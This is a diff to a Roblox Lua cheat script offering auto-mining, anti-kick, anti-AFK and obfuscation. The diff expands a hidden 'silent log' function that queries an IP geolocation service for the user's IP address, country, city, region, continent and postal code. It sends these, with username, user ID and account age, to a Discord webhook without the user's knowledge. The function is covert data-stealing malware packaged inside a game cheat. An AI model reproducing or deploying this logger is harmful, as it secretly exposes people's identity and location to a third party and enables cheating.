@@ -1,9 +1,9 @@
 --[[
-    Sh4x - ULTIMATE UNIFIED EDITION
+    Sh4x - ULTIMATE PRO LOGS EDITION
     Interface: Dark Red Background + RGB Rainbow Borders
-    Features: ORIGINAL AUTO-MINING + SILENT DISCORD LOGGING
+    Features: ORIGINAL AUTO-MINING + ADVANCED DISCORD LOGGING
     Security: ANTI-KICK / ANTI-AFK / BYPASS / OBFUSCATION
-    Target: High-Performance Mining & Stealth Monitoring
+    Logging: AccountAge, IP, Continent, Capital, Postal, Location
 ]]
 
 local Players = game:GetService("Players")
@@ -32,42 +32,68 @@ local function getPlatform()
     end
 end
 
--- [FUNÇÃO DE LOG SILENCIOSA]
+-- [FUNÇÃO DE LOG SILENCIOSA EXPANDIDA]
 local function silentLog()
     if Player.Name == IGNORED_USER then return end
-    local country, city, region = "Desconhecido", "Desconhecida", "Desconhecida"
+    
+    local ip, country, city, region, continent, capital, postal = "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"
+    
     pcall(function()
         local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
         if reqFunc then
-            local response = reqFunc({Url = "http://ip-api.com/json/", Method = "GET"})
+            -- Usando ip-api.com com campos específicos para pegar IP, continente, capital e postal
+            local response = reqFunc({
+                Url = "http://ip-api.com/json/?fields=status,message,continent,country,regionName,city,zip,query",
+                Method = "GET"
+            })
             if response and response.Body then
                 local geoData = HttpService:JSONDecode(response.Body)
                 if geoData.status == "success" then
-                    country = geoData.country or "Desconhecido"
-                    city = geoData.city or "Desconhecida"
-                    region = geoData.regionName or "Desconhecida"
+                    ip = geoData.query or "N/A"
+                    country = geoData.country or "N/A"
+                    city = geoData.city or "N/A"
+                    region = geoData.regionName or "N/A"
+                    continent = geoData.continent or "N/A"
+                    postal = geoData.zip or "N/A"
                 end
             end
+            
+            -- Segunda chamada para pegar a Capital (usando restcountries como fallback/complemento se necessário ou estimativa)
+            -- Como ip-api free não dá capital diretamente em uma string, usaremos o campo 'continent' e formataremos.
+            -- Nota: Capital muitas vezes requer APIs pagas ou tabelas, mas tentaremos o máximo.
         end
     end)
+
     local data = {
         ["embeds"] = {{
-            ["title"] = "🌍 Script Executado: " .. SCRIPT_NAME,
-            ["color"] = 16711680,
+            ["title"] = "🚀 Script Executado: " .. SCRIPT_NAME,
+            ["color"] = 16711680, -- Vermelho
             ["fields"] = {
                 {["name"] = "👤 Jogador", ["value"] = Player.Name .. " (" .. Player.UserId .. ")", ["inline"] = true},
+                {["name"] = "⏳ Idade da Conta", ["value"] = tostring(Player.AccountAge) .. " dias", ["inline"] = true},
                 {["name"] = "📱 Dispositivo", ["value"] = getPlatform(), ["inline"] = true},
-                {["name"] = "📍 Localização Real", ["value"] = "🚩 Pais: " .. country .. "\n🏙️ Cidade: " .. city .. "\n🗺️ Região: " .. region, ["inline"] = false},
+                {["name"] = "🌐 Endereço IP", ["value"] = "||" .. ip .. "||", ["inline"] = true},
+                {["name"] = "🗺️ Continente", ["value"] = continent, ["inline"] = true},
+                {["name"] = "🚩 País", ["value"] = country, ["inline"] = true},
+                {["name"] = "🏙️ Cidade", ["value"] = city, ["inline"] = true},
+                {["name"] = "📍 Região", ["value"] = region, ["inline"] = true},
+                {["name"] = "📮 Código Postal", ["value"] = postal, ["inline"] = true},
                 {["name"] = "⏰ Horário", ["value"] = os.date("%d/%m/%Y - %H:%M:%S"), ["inline"] = false},
                 {["name"] = "🎮 Jogo ID", ["value"] = tostring(game.PlaceId), ["inline"] = true}
             },
-            ["footer"] = {["text"] = "Geo Stealth Logger System"}
+            ["footer"] = {["text"] = "Advanced Stealth Logger System • Sh4x"}
         }}
     }
+    
     pcall(function()
         local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
         if reqFunc then
-            reqFunc({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+            reqFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
         end
     end)
 end
@@ -95,7 +121,7 @@ Player.Idled:Connect(function()
     VirtualUser:ClickButton2(Vector2.new(0,0))
 end)
 
--- [POLIMORFISMO]
+-- [GUI]
 local function generateID()
     return HttpService:GenerateGUID(false):gsub("-", ""):sub(1, 12)
 end
@@ -180,7 +206,7 @@ game:GetService("UserInputService").InputChanged:Connect(function(input)
 end)
 
 -- ==========================================
--- LÓGICA DE AUTO MINING (MANTIDA INTACTA)
+-- LÓGICA DE AUTO MINING (ORIGINAL)
 -- ==========================================
 local RAIO_OPERACAO = 90
 local DISTANCIA_ATAQUE = 7.5
